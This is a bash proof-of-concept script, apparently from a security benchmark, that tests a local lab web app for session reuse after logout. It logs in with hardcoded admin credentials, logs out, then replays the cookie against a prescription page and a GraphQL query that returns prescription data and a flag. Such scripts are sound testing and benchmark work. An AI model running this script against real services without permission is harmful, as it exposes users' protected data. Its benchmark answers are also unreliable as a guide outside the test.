#!/bin/bash
# POC: Demonstrates session reuse vulnerability - accessing protected endpoints with a session cookie after logout
# Target: ./repo
# Created: 2025-11-10T18:33:37.709Z
# Session: benchmark-XBEN-007-24-mhtgyyde

# Session Reuse After Logout - Proof of Concept
# This script demonstrates that sessions remain valid after logout

TARGET_URL="http://localhost:5003"
USERNAME="admin"
PASSWORD="!@ED#"

echo "[*] Session Reuse After Logout - POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login and capture session cookie
echo "[+] Step 1: Logging in as $USERNAME..."
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}")

# Extract session cookie
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "set-cookie:" | grep -i "session=" | head -1 | sed 's/.*session=\([^;]*\).*/\1/' | tr -d '\r\n')

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Failed to extract session cookie"
  exit 1
fi

echo "[+] Session cookie obtained: ${SESSION_COOKIE:0:20}..."
echo ""

# Step 2: Verify access to protected endpoint BEFORE logout
echo "[+] Step 2: Testing access to /add_prescription BEFORE logout..."
BEFORE_LOGOUT=$(curl -s -w "\n%{http_code}" -X GET "$TARGET_URL/add_prescription" \
  -H "Cookie: session=$SESSION_COOKIE")

BEFORE_STATUS=$(echo "$BEFORE_LOGOUT" | tail -1)
BEFORE_BODY=$(echo "$BEFORE_LOGOUT" | head -n-1)

echo "[+] Response status before logout: HTTP $BEFORE_STATUS"
if [ "$BEFORE_STATUS" = "200" ]; then
  echo "[+] Successfully accessed protected endpoint before logout"
  if echo "$BEFORE_BODY" | grep -q "prescription"; then
    echo "[+] Page content contains prescription data (verified)"
  fi
fi
echo ""

# Step 3: Call logout endpoint
echo "[+] Step 3: Calling logout endpoint..."
LOGOUT_RESPONSE=$(curl -s -i -X GET "$TARGET_URL/logout" \
  -H "Cookie: session=$SESSION_COOKIE")

LOGOUT_STATUS=$(echo "$LOGOUT_RESPONSE" | head -1 | awk '{print $2}')
LOGOUT_COOKIE=$(echo "$LOGOUT_RESPONSE" | grep -i "set-cookie:" | head -1)

echo "[+] Logout response status: $LOGOUT_STATUS"
echo "[+] Logout Set-Cookie header: $LOGOUT_COOKIE"
echo "[+] Session should now be invalid on the server"
echo ""

# Step 4: Try to access protected endpoint AFTER logout with same cookie
echo "[+] Step 4: Testing access to /add_prescription AFTER logout with same cookie..."
AFTER_LOGOUT=$(curl -s -w "\n%{http_code}" -X GET "$TARGET_URL/add_prescription" \
  -H "Cookie: session=$SESSION_COOKIE")

AFTER_STATUS=$(echo "$AFTER_LOGOUT" | tail -1)
AFTER_BODY=$(echo "$AFTER_LOGOUT" | head -n-1)

echo "[+] Response status after logout: HTTP $AFTER_STATUS"

if [ "$AFTER_STATUS" = "200" ]; then
  echo "[!] VULNERABILITY CONFIRMED: Endpoint is still accessible after logout!"
  if echo "$AFTER_BODY" | grep -q "prescription"; then
    echo "[!] CRITICAL: Still receiving prescription page content after logout"
    VULNERABILITY_CONFIRMED=1
  fi
else
  echo "[+] Endpoint properly rejected (status $AFTER_STATUS)"
fi
echo ""

# Step 5: Try GraphQL query after logout
echo "[+] Step 5: Testing GraphQL query AFTER logout with same session cookie..."
GRAPHQL_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/graphql" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{getPrescriptions(userId:1){id prescriptionDetails flag}}"}'
)

GRAPHQL_STATUS=$(echo "$GRAPHQL_RESPONSE" | tail -1)
GRAPHQL_BODY=$(echo "$GRAPHQL_RESPONSE" | head -n-1)

echo "[+] GraphQL response status after logout: HTTP $GRAPHQL_STATUS"

if echo "$GRAPHQL_BODY" | grep -q "prescriptionDetails\|flag"; then
  echo "[!] VULNERABILITY CONFIRMED: GraphQL query successful after logout!"
  echo "[!] CRITICAL: Can still access prescription data after logout"
  VULNERABILITY_CONFIRMED=1
  echo ""
  echo "[+] Sample response data retrieved:"
  echo "$GRAPHQL_BODY" | head -c 500
  echo ""
fi
echo ""

# Final verdict
echo "========================================"
if [ "$VULNERABILITY_CONFIRMED" = "1" ]; then
  echo "[!] RESULT: SESSION REUSE VULNERABILITY CONFIRMED"
  echo "[!] Sessions remain valid after logout and can be reused to access protected resources"
  exit 0
else
  echo "[+] RESULT: Session properly invalidated after logout"
  exit 1
fi